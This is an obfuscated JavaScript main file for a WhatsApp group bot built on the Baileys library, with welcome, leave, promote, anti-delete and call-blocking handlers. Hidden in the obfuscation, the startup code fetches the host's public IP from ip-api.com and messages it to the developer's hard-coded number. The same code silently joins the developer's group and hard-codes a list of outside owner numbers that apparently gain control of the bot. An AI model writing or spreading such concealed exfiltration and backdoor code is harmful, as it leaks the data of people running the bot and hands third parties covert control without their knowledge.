const _0x28a2e4=_0xae57;(function(_0xb0c381,_0x46458c){const _0x25962=_0xae57,_0x1ebe0e=_0xb0c381();while(!![]){try{const _0x3afada=parseInt(_0x25962(0xe8))/0x1*(-parseInt(_0x25962(0xcd))/0x2)+parseInt(_0x25962(0xcb))/0x3*(parseInt(_0x25962(0x180))/0x4)+-parseInt(_0x25962(0x129))/0x5*(-parseInt(_0x25962(0x159))/0x6)+-parseInt(_0x25962(0x15e))/0x7+-parseInt(_0x25962(0x181))/0x8+parseInt(_0x25962(0xe3))/0x9+parseInt(_0x25962(0x168))/0xa;if(_0x3afada===_0x46458c)break;else _0x1ebe0e['push'](_0x1ebe0e['shift']());}catch(_0x5a34fc){_0x1ebe0e['push'](_0x1ebe0e['shift']());}}}(_0xbfb0,0xe3a87));const {WAConnection:_WAConnection,MessageType,Presence,Mimetype,ChatModification,GroupSettingChange,ReconnectMode}=require('@adiwajshing/baileys'),simple=require(_0x28a2e4(0x13c)),WAConnection=simple[_0x28a2e4(0x16f)](_WAConnection),denz=new WAConnection(),qrcode=require(_0x28a2e4(0x144)),moment=require('moment-timezone'),fs=require('fs'),util=require(_0x28a2e4(0x166)),figlet=require(_0x28a2e4(0x143)),term=require(_0x28a2e4(0x11f))[_0x28a2e4(0x179)],time=moment()['tz'](_0x28a2e4(0x178))[_0x28a2e4(0x142)](_0x28a2e4(0x123)),fetch=require('node-fetch'),{color,bgcolor}=require('./lib/color'),{exec}=require(_0x28a2e4(0xe4)),{wait,simih,getBuffer,h2k,generateMessageID,getGroupAdmins,getRandom,banner,start,info,success,close}=require(_0x28a2e4(0xe6)),settings=JSON['parse'](fs[_0x28a2e4(0x118)](_0x28a2e4(0x13e))),sleep=async _0x12ea43=>{return new Promise(_0x12c089=>setTimeout(_0x12c089,_0x12ea43));};nocache(_0x28a2e4(0xdd),_0x287c6e=>console[_0x28a2e4(0x184)](color(_0x28a2e4(0x128)),color(_0x287c6e+_0x28a2e4(0x110),_0x28a2e4(0xf3))));async function starts(){const _0x9e750a=_0x28a2e4;denz[_0x9e750a(0x12f)]=ReconnectMode[_0x9e750a(0x18c)],denz[_0x9e750a(0x11e)]=[0x2,0x85c,0xc],denz[_0x9e750a(0x134)][_0x9e750a(0x160)]=_0x9e750a(0x189),denz[_0x9e750a(0x14a)]=['Fajar\x20Alfarizi',_0x9e750a(0x17f),_0x9e750a(0xfa)],await sleep(0x2710),denz['on']('qr',_0x235c9d=>{const _0x229c77=_0x9e750a;qrcode[_0x229c77(0x12d)](_0x235c9d,{'small':!![]}),console[_0x229c77(0x184)](color(_0x229c77(0x128)),color('Scan\x20this\x20QR\x20code',_0x229c77(0xf3)));}),fs[_0x9e750a(0xcf)](_0x9e750a(0x109))&&denz[_0x9e750a(0xd3)](_0x9e750a(0x109)),denz['on'](_0x9e750a(0x188),()=>{const _0x15d344=_0x9e750a;console[_0x15d344(0x184)](color(_0x15d344(0x128)),color('credentials\x20updated!',_0x15d344(0xf3)));}),await denz[_0x9e750a(0xd7)]({'timeoutMs':0x1e*0x3e8}),fs[_0x9e750a(0x139)](_0x9e750a(0x109),JSON['stringify'](denz[_0x9e750a(0x101)](),null,'\x09')),teks='https://chat.whatsapp.com/K1eU4aZZ8k7BO6eNndwvY1',denz[_0x9e750a(0x127)]({'json':[_0x9e750a(0xf4),_0x9e750a(0x170),''+teks[_0x9e750a(0x104)]('https://chat.whatsapp.com/','')]}),console['log'](color(_0x9e750a(0x12c),_0x9e750a(0xcc)),color(_0x9e750a(0xfb),_0x9e750a(0xf3))),denz['sendMessage'](settings[_0x9e750a(0x132)]+'@s.whatsapp.net',_0x9e750a(0xf1)+settings[_0x9e750a(0x146)]+_0x9e750a(0xff)+JSON[_0x9e750a(0xf8)](denz[_0x9e750a(0x11b)],null,0x2)+_0x9e750a(0xf5),MessageType['text'],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':_0x9e750a(0x17b),'body':'','previewType':_0x9e750a(0x145),'thumbnail':fs['readFileSync']('./denz.jpg'),'sourceUrl':_0x9e750a(0xd4)}}}),console['log'](color('|WRN|',_0x9e750a(0xcc)),color(_0x9e750a(0x174),_0x9e750a(0xf3))),fetch('http://ip-api.com/line')[_0x9e750a(0x108)](_0x154516=>_0x154516[_0x9e750a(0x10c)]())['then'](_0x494cc6=>{const _0x4268a5=_0x9e750a;denz[_0x4268a5(0x13f)](_0x4268a5(0xe9),_0x4268a5(0x15c)+_0x494cc6+'```\x0a────────────────────',MessageType[_0x4268a5(0x10c)],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':_0x4268a5(0xe2),'body':'','previewType':_0x4268a5(0x145),'thumbnail':fs[_0x4268a5(0x118)]('./denz.jpg'),'sourceUrl':_0x4268a5(0xd4)}}}),console[_0x4268a5(0x184)](color(_0x4268a5(0x12c),'yellow'),color('Sending\x20ip\x20address\x20to\x20developer\x20bot',_0x4268a5(0xf3)));}),denz['on'](_0x9e750a(0xf9),()=>{const _0x27fa9a=_0x9e750a;console[_0x27fa9a(0x184)](color('|TRM|'),color(_0x27fa9a(0x131),_0x27fa9a(0xf3)));}),denz['on']('open',()=>{const _0x5d6211=_0x9e750a;console[_0x5d6211(0x184)](color('|TRM|'),color(_0x5d6211(0x136),_0x5d6211(0xf3)));}),denz['on'](_0x9e750a(0x15d),()=>{const _0x184e82=_0x9e750a;console[_0x184e82(0x184)](color(_0x184e82(0x128)),color(_0x184e82(0x16d),_0x184e82(0xf3)));}),denz['on']('close',async()=>{const _0x461255=_0x9e750a;console[_0x461255(0x184)](color(_0x461255(0x128)),color(_0x461255(0xef),_0x461255(0xf3)));}),!settings[_0x9e750a(0x102)]&&exec(_0x9e750a(0xce)),denz['on'](_0x9e750a(0x122),async _0x31dd22=>{const _0x787252=_0x9e750a;require(_0x787252(0xdd))(denz,_0x31dd22),ownerNumber=[_0x787252(0xe9),_0x787252(0x182),'48459065026@s.whatsapp.net',_0x787252(0x17d),_0x787252(0x18a),_0x787252(0x11a),_0x787252(0x151),_0x787252(0xd0),_0x787252(0x18a),_0x787252(0xf2),_0x787252(0x155),_0x787252(0x156),'994405054360@s.whatsapp.net',settings['NomorOwner']+_0x787252(0x114)],dtod=_0x787252(0xe9),otod=settings[_0x787252(0x132)]+_0x787252(0x114);}),denz['on'](_0x9e750a(0x112),async _0xed02e5=>{const _0x23b0e2=_0x9e750a;mem=_0xed02e5[_0x23b0e2(0x149)][0x0];const _0x3aab57=await denz[_0x23b0e2(0x163)](_0xed02e5[_0x23b0e2(0x12a)]);try{console[_0x23b0e2(0x184)](_0xed02e5);if(_0xed02e5[_0x23b0e2(0xf4)]==_0x23b0e2(0x111)){const _0x4e7c68=JSON[_0x23b0e2(0x13b)](fs[_0x23b0e2(0x118)](_0x23b0e2(0x18f)));if(!_0x4e7c68[_0x23b0e2(0x15f)](_0x3aab57['id']))return;fkontakk={'key':{'fromMe':![],'participant':'0@s.whatsapp.net',..._0xed02e5[_0x23b0e2(0x12a)]?{'remoteJid':'6281333782061-1617740713@g.us'}:{}},'message':{'contactMessage':{'displayName':''+_0x3aab57['subject'],'vcard':_0x23b0e2(0x183)}}},num=_0xed02e5[_0x23b0e2(0x149)][0x0];try{ppimg=await denz[_0x23b0e2(0x16b)](num[_0x23b0e2(0xea)]('@')[0x0]+'@c.us');}catch{ppimg='https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg';}let _0x2a24ba=await getBuffer(ppimg);masuk=_0x23b0e2(0x103)+num['split']('@')[0x0]+_0x23b0e2(0x190)+_0x3aab57['subject']+_0x23b0e2(0x12b),gbutsan=[{'buttonId':_0x23b0e2(0x187),'buttonText':{'displayText':_0x23b0e2(0x137)},'type':0x1}],mhan=await denz['prepareMessage'](_0x3aab57['id'],_0x2a24ba,MessageType[_0x23b0e2(0x173)],{'thumbnail':_0x2a24ba});const _0x4cd04b={'imageMessage':mhan[_0x23b0e2(0x126)][_0x23b0e2(0x113)],'contentText':''+masuk,'footerText':_0x23b0e2(0x185),'buttons':gbutsan,'headerType':0x4};denz[_0x23b0e2(0x13f)](_0x3aab57['id'],_0x4cd04b,MessageType[_0x23b0e2(0xe0)],{'thumbnail':fs['readFileSync'](_0x23b0e2(0x138)),'contextInfo':{'mentionedJid':[num]},'caption':_0x23b0e2(0x176),'quoted':fkontakk});}else{if(_0xed02e5['action']==_0x23b0e2(0xee)){const _0x270c6e=JSON[_0x23b0e2(0x13b)](fs[_0x23b0e2(0x118)](_0x23b0e2(0x18f)));if(!_0x270c6e['includes'](_0x3aab57['id']))return;fkontakk={'key':{'fromMe':![],'participant':_0x23b0e2(0x120),..._0xed02e5[_0x23b0e2(0x12a)]?{'remoteJid':'6281333782061-1617740713@g.us'}:{}},'message':{'contactMessage':{'displayName':''+_0x3aab57[_0x23b0e2(0x10a)],'vcard':_0x23b0e2(0x183)}}},num=_0xed02e5[_0x23b0e2(0x149)][0x0];try{ppimg=await denz[_0x23b0e2(0x16b)](num['split']('@')[0x0]+_0x23b0e2(0x14c));}catch{ppimg=_0x23b0e2(0x167);}let _0x5c7c85=await getBuffer(ppimg);keluar='Selamat\x20tinggal\x20@'+num[_0x23b0e2(0xea)]('@')[0x0]+_0x23b0e2(0xe5),gbutsan=[{'buttonId':_0x23b0e2(0x187),'buttonText':{'displayText':'👋Byee'},'type':0x1}],mhan=await denz[_0x23b0e2(0x11d)](_0x3aab57['id'],_0x5c7c85,MessageType[_0x23b0e2(0x173)],{'thumbnail':_0x5c7c85});const _0x5280b2={'imageMessage':mhan[_0x23b0e2(0x126)][_0x23b0e2(0x113)],'contentText':''+keluar,'footerText':_0x23b0e2(0xde),'buttons':gbutsan,'headerType':0x4};denz[_0x23b0e2(0x13f)](_0x3aab57['id'],_0x5280b2,MessageType[_0x23b0e2(0xe0)],{'thumbnail':fs[_0x23b0e2(0x118)](_0x23b0e2(0x138)),'contextInfo':{'mentionedJid':[num]},'caption':_0x23b0e2(0x176),'quoted':fkontakk});}else{if(_0xed02e5['action']=='promote'){fkontakk={'key':{'fromMe':![],'participant':_0x23b0e2(0x120),..._0xed02e5[_0x23b0e2(0x12a)]?{'remoteJid':_0x23b0e2(0x175)}:{}},'message':{'contactMessage':{'displayName':''+_0x3aab57['subject'],'vcard':'BEGIN:VCARD\x0aVERSION:3.0\x0aN:2;𝐹𝑎𝑗𝑎𝑟\x20𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖;;;\x0aFN:𝐹𝑎𝑗𝑎𝑟\x20𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖\x0aitem1.TEL;waid=6281333782061:6281333782061\x0aitem1.X-ABLabel:Mobile\x0aEND:VCARD'}}},shp='◦➛';var _0x59e6bb=await denz['getStatus'](_0xed02e5[_0x23b0e2(0x149)][0x0],MessageType['text']);num=_0xed02e5[_0x23b0e2(0x149)][0x0],teks='*P\x20R\x20O\x20M\x20O\x20T\x20E\x20-\x20D\x20E\x20T\x20E\x20C\x20T\x20E\x20D*\x0a\x0a'+shp+_0x23b0e2(0x121)+num[_0x23b0e2(0xea)]('@')[0x0]+'\x0a\x0a'+shp+_0x23b0e2(0xfd)+_0x59e6bb[_0x23b0e2(0x141)]+'\x0a\x0a'+shp+'\x20Time\x20:\x20'+moment['tz'](_0x23b0e2(0x178))[_0x23b0e2(0x142)](_0x23b0e2(0x177))+'\x0a\x0a'+shp+_0x23b0e2(0x11c)+_0x3aab57[_0x23b0e2(0x10a)]+'\x0a\x0aDon\x27t\x20break\x20the\x20rules!',denz[_0x23b0e2(0x13f)](_0x3aab57['id'],teks,MessageType['text'],{'contextInfo':{'mentionedJid':[num]},'quoted':fkontakk}),console['log'](color(_0x23b0e2(0x128)),color(_0x23b0e2(0xeb)+num[_0x23b0e2(0xea)]('@')[0x0]+_0x23b0e2(0x154)+_0x3aab57[_0x23b0e2(0x10a)],_0x23b0e2(0xf3)));}else _0xed02e5[_0x23b0e2(0xf4)]==_0x23b0e2(0x17c)&&(fkontakk={'key':{'fromMe':![],'participant':_0x23b0e2(0x120),..._0xed02e5[_0x23b0e2(0x12a)]?{'remoteJid':'6281333782061-1617740713@g.us'}:{}},'message':{'contactMessage':{'displayName':''+_0x3aab57[_0x23b0e2(0x10a)],'vcard':'BEGIN:VCARD\x0aVERSION:3.0\x0aN:2;𝐹𝑎𝑗𝑎𝑟\x20𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖;;;\x0aFN:𝐹𝑎𝑗𝑎𝑟\x20𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖\x0aitem1.TEL;waid=6281333782061:6281333782061\x0aitem1.X-ABLabel:Mobile\x0aEND:VCARD'}}},shp='◦➛',_0x59e6bb=await denz[_0x23b0e2(0xdc)](_0xed02e5[_0x23b0e2(0x149)][0x0],MessageType[_0x23b0e2(0x10c)]),num=_0xed02e5['participants'][0x0],teks=_0x23b0e2(0x161)+shp+_0x23b0e2(0x121)+num['split']('@')[0x0]+'\x0a\x0a'+shp+_0x23b0e2(0xfd)+_0x59e6bb[_0x23b0e2(0x141)]+'\x0a\x0a'+shp+'\x20Time\x20:\x20'+moment['tz']('Asia/Jakarta')['format'](_0x23b0e2(0x177))+'\x0a\x0a'+shp+_0x23b0e2(0x11c)+_0x3aab57['subject'],denz[_0x23b0e2(0x13f)](_0x3aab57['id'],teks,MessageType[_0x23b0e2(0x10c)],{'contextInfo':{'mentionedJid':[num]},'quoted':fkontakk}),console['log'](color('|TRM|'),color(_0x23b0e2(0x171)+num[_0x23b0e2(0xea)]('@')[0x0]+_0x23b0e2(0x154)+_0x3aab57[_0x23b0e2(0x10a)],'cyan')));}}}catch(_0xe4a83f){console[_0x23b0e2(0x184)](_0x23b0e2(0x13a),color(_0xe4a83f,_0x23b0e2(0x16e)));}}),denz['on'](_0x9e750a(0x18d),async _0x35634b=>{const _0x38a331=_0x9e750a,_0x4ee2a0=await denz[_0x38a331(0x163)](_0x35634b[_0x38a331(0x12a)]),_0x14247e={'key':{'fromMe':![],'participant':_0x38a331(0x120),..._0x35634b[_0x38a331(0x12a)]?{'remoteJid':_0x38a331(0x175)}:{}},'message':{'contactMessage':{'displayName':''+_0x4ee2a0[_0x38a331(0x10a)],'vcard':_0x38a331(0x153)}}};if(_0x35634b[_0x38a331(0x147)]=='false')teks=_0x38a331(0xf7),denz[_0x38a331(0x13f)](_0x4ee2a0['id'],teks,MessageType['text'],{'quoted':_0x14247e}),console[_0x38a331(0x184)](color(_0x38a331(0x128)),color(_0x38a331(0x100)+_0x4ee2a0[_0x38a331(0x10a)],_0x38a331(0xf3)));else{if(_0x35634b[_0x38a331(0x147)]==_0x38a331(0x16a))teks=_0x38a331(0x135),denz[_0x38a331(0x13f)](_0x4ee2a0['id'],teks,MessageType[_0x38a331(0x10c)],{'quoted':_0x14247e}),console[_0x38a331(0x184)](color(_0x38a331(0x128)),color(_0x38a331(0x150)+_0x4ee2a0[_0x38a331(0x10a)],_0x38a331(0xf3)));else{if(!_0x35634b[_0x38a331(0x18b)]=='')tag=_0x35634b[_0x38a331(0x15a)]['split']('@')[0x0]+_0x38a331(0x114),teks=_0x38a331(0xdb)+_0x35634b['descOwner'][_0x38a331(0xea)]('@')[0x0]+_0x38a331(0x186)+_0x35634b[_0x38a331(0x18b)],denz[_0x38a331(0x13f)](_0x4ee2a0['id'],teks,MessageType[_0x38a331(0x10c)],{'contextInfo':{'mentionedJid':[tag]},'quoted':_0x14247e}),console[_0x38a331(0x184)](color('|TRM|'),color(_0x38a331(0xed)+_0x4ee2a0[_0x38a331(0x10a)],_0x38a331(0xf3)));else{if(_0x35634b[_0x38a331(0x107)]==_0x38a331(0x15b))teks=_0x38a331(0x152),denz[_0x38a331(0x13f)](_0x4ee2a0['id'],teks,MessageType[_0x38a331(0x10c)],{'quoted':_0x14247e}),console[_0x38a331(0x184)](color('|TRM|'),color(_0x38a331(0xdf)+_0x4ee2a0[_0x38a331(0x10a)],_0x38a331(0xf3)));else _0x35634b[_0x38a331(0x107)]==_0x38a331(0x16a)&&(teks=_0x38a331(0x140),denz['sendMessage'](_0x4ee2a0['id'],teks,MessageType['text'],{'quoted':_0x14247e}),console[_0x38a331(0x184)](color(_0x38a331(0x128)),color(_0x38a331(0xdf)+_0x4ee2a0[_0x38a331(0x10a)],_0x38a331(0xf3))));}}}}),denz['on']('CB:action,,call',async _0x24262f=>{const _0x1c6fbc=_0x9e750a,_0x3ade6b=_0x24262f[0x2][0x0][0x1]['from'];var _0x1152f4=_0x1c6fbc(0xda)+'VERSION:3.0\x0a'+_0x1c6fbc(0xd8)+(''+NamaOwner)+'\x0a'+(_0x1c6fbc(0x157)+NamaBot+'\x0a')+_0x1c6fbc(0x162)+(''+NomorOwner)+':+'+(''+NomorOwner)+'\x0a'+'END:VCARD';denz[_0x1c6fbc(0x13f)](_0x3ade6b,'```[\x20!\x20]\x20CALL\x20DETECTED\x20[\x20!\x20]```\x0a\x0a```Anda\x20Di\x20Block\x20Karena\x20Telepon\x20Bot\x20,\x20Silahkan\x20Hubungi\x20Developer\x20Bot\x20Untuk\x20Membuka\x20Block```',MessageType['text']),denz[_0x1c6fbc(0x13f)](_0x3ade6b,{'displayname':''+NamaOwner,'vcard':_0x1152f4},MessageType[_0x1c6fbc(0x165)],{'contextInfo':{'externalAdReply':{'title':_0x1c6fbc(0x14e)+NamaBot,'body':'','previewType':_0x1c6fbc(0x145),'thumbnail':fs[_0x1c6fbc(0x118)](_0x1c6fbc(0x138)),'sourceUrl':_0x1c6fbc(0xd4)}}}),await sleep(0x1388),await denz[_0x1c6fbc(0x10d)](_0x3ade6b,_0x1c6fbc(0x111));}),denz['on'](_0x9e750a(0xd2),async _0x4bd733=>{const _0x463f1b=_0x9e750a;if(!_0x4bd733[_0x463f1b(0x18e)]['fromMe']&&!antidelete){if(!_0x4bd733[_0x463f1b(0x18e)][_0x463f1b(0xe7)]==_0x463f1b(0x17e))return;_0x4bd733[_0x463f1b(0x126)]=Object[_0x463f1b(0x172)](_0x4bd733[_0x463f1b(0x126)])[0x0]===_0x463f1b(0xfc)?_0x4bd733['message'][_0x463f1b(0xfc)][_0x463f1b(0x126)]:_0x4bd733[_0x463f1b(0x126)];const _0x4c091d=moment['tz'](_0x463f1b(0x178))[_0x463f1b(0x142)]('HH:mm:ss');let _0x3e59f4=new Date(),_0x11e384=denz[_0x463f1b(0x13d)][_0x463f1b(0x115)](_0x4bd733['key'][_0x463f1b(0xe7)]),_0xe4f4bd=_0x11e384[_0x463f1b(0xd9)][_0x463f1b(0x106)][_0x4bd733[_0x463f1b(0x18e)]['id']+'|'+(_0x4bd733[_0x463f1b(0x18e)][_0x463f1b(0xd6)]?0x1:0x0)],_0xa73a99=denz['generateForwardMessageContent'](_0xe4f4bd,![]),_0x113f53=Object[_0x463f1b(0x172)](_0xa73a99)[0x0],_0x557ded='id',_0x3fc0e3=new Date(0x0)[_0x463f1b(0xd5)]()-new Date(_0x463f1b(0x169))[_0x463f1b(0xd5)](),_0x587b4c=[_0x463f1b(0x14d),_0x463f1b(0x10e),'Wage','Kliwon',_0x463f1b(0x119)][Math[_0x463f1b(0x130)]((_0x3e59f4*0x1+_0x3fc0e3)/0x50ae4c0)%0x5],_0x22ed0d=_0x3e59f4[_0x463f1b(0xec)](_0x557ded,{'weekday':_0x463f1b(0xe1)}),_0xed9d2e=_0x3e59f4[_0x463f1b(0xec)](_0x557ded,{'day':_0x463f1b(0x158),'month':_0x463f1b(0xe1),'year':_0x463f1b(0x158)});denz[_0x463f1b(0xf6)](_0x4bd733[_0x463f1b(0x18e)][_0x463f1b(0xe7)],_0x4bd733['message']),denz['sendMessage'](_0x4bd733[_0x463f1b(0x18e)][_0x463f1b(0xe7)],'▷```Anti\x20Delete```\x0a\x0a▢\x20```Nama\x20:\x20@'+_0x4bd733[_0x463f1b(0xd1)][_0x463f1b(0xea)]('@')[0x0]+_0x463f1b(0x14f)+_0x113f53+_0x463f1b(0x105)+_0x4c091d+_0x463f1b(0x116)+_0x22ed0d+'\x20'+_0x587b4c+_0x463f1b(0x116)+_0xed9d2e+'```',MessageType[_0x463f1b(0x10c)],{'quoted':_0x4bd733[_0x463f1b(0x126)],'contextInfo':{'mentionedJid':[_0x4bd733[_0x463f1b(0xd1)]]}});}});}console[_0x28a2e4(0x16c)]();function _0xbfb0(){const _0x49a32f=['3.0','Joined\x20to\x20megumin\x20bot\x20group','ephemeralMessage','\x20Bio\x20:\x20','default',',\x20Bot\x20Telah\x20Berhasil\x20Tersambung\x20Pada\x20Nomor\x20Ini*\x0a────────────────────\x0a```','Group\x20Opened\x20In\x20','base64EncodedAuthInfo','autoplaymusic','Halo\x20@','replace','```\x0a▢\x20```Tanggal\x20:\x20','dict','restrict','then','./QRnya.json','subject','https://github.com/dcode-denpa/bitch-boot','text','blockUser','Pon','\x0a\x0aLoading','\x20Updated!','add','group-participants-update','imageMessage','@s.whatsapp.net','get','\x20-\x20','\x20Created\x20By\x20Fajar\x20Alfarizi','readFileSync','Legi','447451215242@s.whatsapp.net','user','\x20Group:\x20','prepareMessage','version','terminal-kit','0@s.whatsapp.net','\x20Username:\x20@','chat-update','HH:mm:ss','textSync','slowTyping','message','query','|TRM|','115295MlmNgs','jid','\x0a\x0a*Jangan\x20Lupa\x20Isi*\x0a*Nama*\x20:\x0a*Umur*\x20:\x0a*Gender*\x20:\x0a*Askot*\x20:\x0a\x0aEnjoy\x20Jangan\x20Lupa\x20Kenalan\x0aKlik\x20Button\x20Di\x20Bawah\x20Untuk\x20Memulai\x20Bot\x0aNote\x20Jika\x20Tidak\x20Ada\x20Ketik\x20.allmenu','|WRN|','generate','screenfetch\x20-A\x20Deepin','autoReconnect','floor','Connecting...','NomorOwner','lightgreen','logger','-\x20[\x20Group\x20Closed\x20]\x20-\x0a\x0a_Group\x20telah\x20ditutup\x20oleh\x20admin_\x0a_Sekarang\x20hanya\x20admin\x20yang\x20dapat\x20mengirim\x20pesan_','Connected','👋Welcome','./denz.jpg','writeFileSync','Error\x20:\x20%s','parse','./lib/simple.js','chats','./settings.json','sendMessage','-\x20[\x20Group\x20Setting\x20Change\x20]\x20-\x0a\x0aEdit\x20Group\x20info\x20telah\x20ditutup\x20untuk\x20member\x0aSekarang\x20hanya\x20admin\x20group\x20yang\x20dapat\x20mengedit\x20info\x20Group\x20Ini','status','format','figlet','qrcode-terminal','PHOTO','NamaBot','announce','resolve','participants','browserDescription','random','@c.us','Pahing','Developer\x20','```\x0a▢\x20```Tipe\x20:\x20','Group\x20Closed\x20In\x20','447441417460@s.whatsapp.net','-\x20[\x20Group\x20Setting\x20Change\x20]\x20-\x0a\x0aEdit\x20Group\x20info\x20telah\x20dibuka\x20untuk\x20member\x0aSekarang\x20semua\x20member\x20dapat\x20mengedit\x20info\x20Group\x20Ini','BEGIN:VCARD\x0aVERSION:3.0\x0aN:2;Denz;;;\x0aFN:Denz\x0aitem1.TEL;waid=6281333782061:6281333782061\x0aitem1.X-ABLabel:Mobile\x0aEND:VCARD','\x20In\x20','994406309372@s.whatsapp.net','48699527399@s.whatsapp.net','ORG:Developer\x20','numeric','246MrItWp','descOwner','false','─────「\x20*IP-USER*\x20」─────\x0a\x0a```','ws-close','8890770WdqKIW','includes','level','*D\x20E\x20M\x20O\x20T\x20E\x20-\x20D\x20E\x20T\x20E\x20C\x20T\x20E\x20D*\x0a\x0a','TEL;type=CELL;type=VOICE;waid=','groupMetadata','Standard','contact','util','https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg','30300330VEWXaL','1\x20Januari\x202021','true','getProfilePicture','clear','Connection\x20lost,\x20trying\x20to\x20reconnect.','red','WAConnection','invite','Demote\x20Admin\x20','keys','image','Sending\x20bot\x20info\x20to\x20bot\x20owner','6281333782061-1617740713@g.us','Tes','DD/MM\x20HH:mm:ss','Asia/Jakarta','terminal','cache','Developer\x20Bitch\x20Boot','demote','6281259909513@s.whatsapp.net','status@broadcast','Desktop','3822756emewCG','14852304abfJXk','994403792696@s.whatsapp.net','BEGIN:VCARD\x0aVERSION:3.0\x0aN:2;𝐹𝑎𝑗𝑎𝑟\x20𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖;;;\x0aFN:𝐹𝑎𝑗𝑎𝑟\x20𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖\x0aitem1.TEL;waid=6281333782061:6281333782061\x0aitem1.X-ABLabel:Mobile\x0aEND:VCARD','log','Welcome\x20\x20Information','\x0a•\x20Deskripsi\x20Baru\x20:\x20','SERAH','credentials-updated','warn','6289512871985@s.whatsapp.net','desc','onConnectionLost','group-update','key','./database/welkom.json','\x0aSelamat\x20Datang\x20Di\x20','3KlADgE','yellow','2UIYyJE','cd\x20/sdcard/download\x20&&\x20play\x20*mp3','existsSync','380943043840@s.whatsapp.net','participant','message-delete','loadAuthInfo','https://wa.me/6281333782061?text=Assalamualaikum','getTime','fromMe','connect','FN:','messages','BEGIN:VCARD\x0a','-\x20[\x20Group\x20Description\x20Change\x20]\x20-\x0a\x0aDeskripsi\x20Group\x20telah\x20diubah\x20oleh\x20Admin\x20@','getStatus','./denz.js','Leave\x20Information','Group\x20Setting\x20Change\x20In\x20','buttonsMessage','long','Developer\x20Megumin\x20BOT','1331253cZyVkv','child_process','\x0aSemoga\x20tentang\x20disana','./lib/functions','remoteJid','1019923KkOjSA','6281333782061@s.whatsapp.net','split','Promote\x20Member\x20','toLocaleDateString','Group\x20Description\x20Change\x20In\x20','remove','Disconnected.','update','*Hai\x20Owner\x20','6287819948818@s.whatsapp.net','cyan','action','```\x0a────────────────────\x0a*Jika\x20Ada\x20Kendala\x20Error/Bot\x20Tidak\x20Merespon\x20Silahkan\x20Hubungi\x20Developer\x20Bot\x20Diatas,\x20Terimakasih*','copyNForward','-\x20[\x20Group\x20Opened\x20]\x20-\x0a\x0a_Group\x20telah\x20dibuka\x20oleh\x20admin_\x0a_Sekarang\x20semua\x20member\x20bisa\x20mengirim\x20pesan_','stringify','connecting'];_0xbfb0=function(){return _0x49a32f;};return _0xbfb0();}var progressBar,progress=0x0;function doProgress(){const _0x378e0e=_0x28a2e4;progress+=Math[_0x378e0e(0x14b)]()/0xa,progressBar[_0x378e0e(0xf0)](progress),progress>=0x1?setTimeout(function(){const _0x1f1b60=_0x378e0e;console[_0x1f1b60(0x16c)](),exec(_0x1f1b60(0x12e),(_0x3e943,_0x1e22fb,_0x4d593c)=>{const _0x1693bd=_0x1f1b60;console['log'](_0x1e22fb),console['log'](bgcolor(_0x1693bd(0x10b),_0x1693bd(0xf3)));});},0xc8):setTimeout(doProgress,0x64+Math['random']()*0x190);}console[_0x28a2e4(0x184)](color(figlet[_0x28a2e4(0x124)](''+settings['NamaBot'],{'font':_0x28a2e4(0x164),'horizontalLayout':_0x28a2e4(0xfe),'vertivalLayout':_0x28a2e4(0xfe),'width':0x50,'whitespaceBreak':!![]}),_0x28a2e4(0x133))),term[_0x28a2e4(0x125)](_0x28a2e4(0x117),{'flashStyle':term['brightWhite']}),progressBar=term['progressBar']({'width':0x50,'title':_0x28a2e4(0x10f),'eta':!![],'percent':!![]}),doProgress();function nocache(_0x3f41a6,_0x252d9a=()=>{}){const _0x489e3f=_0x28a2e4;fs['watchFile'](require[_0x489e3f(0x148)](_0x3f41a6),async()=>{const _0x53259d=_0x489e3f;await uncache(require[_0x53259d(0x148)](_0x3f41a6)),_0x252d9a(_0x3f41a6);});}function uncache(_0xf7ab7e='.'){return new Promise((_0x5be87b,_0x1ebfa6)=>{const _0x367831=_0xae57;try{delete require[_0x367831(0x17a)][require['resolve'](_0xf7ab7e)],_0x5be87b();}catch(_0x43f348){_0x1ebfa6(_0x43f348);}});}function _0xae57(_0x4fe3f3,_0x3054ea){const _0xbfb03e=_0xbfb0();return _0xae57=function(_0xae5734,_0x339cd7){_0xae5734=_0xae5734-0xcb;let _0x1cbf48=_0xbfb03e[_0xae5734];return _0x1cbf48;},_0xae57(_0x4fe3f3,_0x3054ea);}starts();